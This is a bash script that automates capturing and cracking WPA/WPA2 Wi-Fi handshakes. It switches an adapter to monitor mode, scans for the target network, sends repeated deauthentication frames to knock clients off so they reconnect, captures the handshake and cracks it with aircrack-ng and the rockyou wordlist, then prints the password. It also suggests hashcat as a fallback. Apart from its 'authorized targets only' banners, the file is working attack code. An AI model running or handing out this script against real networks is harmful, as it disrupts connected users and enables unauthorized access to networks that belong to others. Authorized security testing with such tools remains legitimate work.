#!/bin/bash
# ============================================================================
#  Wi-Fi WPA/WPA2 handshake capture + crack  --  AUTHORIZED TARGETS ONLY
#  Run ONLY against a network you OWN or have explicit permission to test
#  (your own hotspot, or a sanctioned competition/lab AP the organiser allows).
#  Usage:  wifi-handshake.sh <TARGET_BSSID> [wordlist]
#  Example: wifi-handshake.sh AA:BB:CC:DD:EE:FF /usr/share/wordlists/rockyou.txt
# ============================================================================
set -uo pipefail
IFACE=wlan0
BSSID="${1:-}"
WL="${2:-/usr/share/wordlists/rockyou.txt}"
TAG=$(date +%H%M%S); OUT=/tmp/hs_$TAG
say(){ echo "[*] $*"; }

[ -z "$BSSID" ] && { echo "usage: wifi-handshake.sh <AUTHORIZED_BSSID> [wordlist]"; exit 1; }
echo "[!] AUTHORIZED TARGETS ONLY — you must own $BSSID or have explicit permission."

# 0) reset adapter (RTL8188EU hangs under load) + monitor mode
sudo pkill -9 airodump-ng aireplay-ng 2>/dev/null
sudo modprobe -r rtl8xxxu 2>/dev/null; sleep 1; sudo modprobe rtl8xxxu 2>/dev/null; sleep 3
sudo ip link set $IFACE down; sudo iw dev $IFACE set type monitor; sudo ip link set $IFACE up; sleep 1

# 1) find the target's channel — scans ALL 2.4GHz channels (one channel is not enough)
say "scanning all channels for $BSSID ..."
sudo rm -f ${OUT}_ch* 2>/dev/null
sudo timeout 12 airodump-ng --band bg --bssid $BSSID $IFACE --write ${OUT}_ch --output-format csv >/dev/null 2>&1
CH=$(grep -i "$BSSID" ${OUT}_ch-01.csv 2>/dev/null | awk -F, '{gsub(/ /,"",$4); print $4; exit}')
[ -z "$CH" ] && { echo "[!] target not in range / not on (2.4GHz, powered on?)"; exit 1; }
say "target is on channel $CH"

# 2) capture the 4-way handshake (a client must (re)connect, so we deauth to force it)
say "capturing handshake — deauthing clients so they reconnect ..."
sudo airodump-ng -c $CH --bssid $BSSID -w ${OUT} $IFACE >/dev/null 2>&1 &
AD=$!; sleep 6; GOT=0
clients(){ awk -F, 'f{gsub(/ /,"",$1);gsub(/ /,"",$6); if($6=="'"$BSSID"'" && $1 ~ /^([0-9A-Fa-f]{2}:){5}/) print $1} /Station MAC/{f=1}' ${OUT}-01.csv 2>/dev/null; }
for r in 1 2 3 4 5 6; do
  CL=$(clients)
  if [ -n "$CL" ]; then for c in $CL; do sudo timeout 5 aireplay-ng --deauth 3 -a $BSSID -c $c $IFACE >/dev/null 2>&1; done
  else sudo timeout 5 aireplay-ng --deauth 3 -a $BSSID $IFACE >/dev/null 2>&1; fi
  sleep 4
  sudo aircrack-ng ${OUT}-01.cap 2>/dev/null | grep -q "1 handshake" && { say "handshake captured (round $r)"; GOT=1; break; }
done
sudo kill $AD 2>/dev/null; sleep 1
if [ "$GOT" != 1 ]; then echo "[!] no handshake — make sure a device is CONNECTED to the target (a client must reconnect)"; exit 2; fi

# 3) crack it (try the given wordlist; swap in others for 'multiple options')
say "cracking with: $WL"
sudo aircrack-ng -w "$WL" -b $BSSID -l ${OUT}.key ${OUT}-01.cap 2>&1 | tail -12
if [ -s ${OUT}.key ]; then
  echo "[+] PASSWORD FOUND: $(cat ${OUT}.key)"
else
  echo "[!] not in that wordlist. Options: try another list, or a GPU machine with hashcat:"
  echo "    hcxpcapngtool -o ${OUT}.hc22000 ${OUT}-01.cap  &&  hashcat -m 22000 ${OUT}.hc22000 <wordlist>"
fi
echo "capture saved: ${OUT}-01.cap"
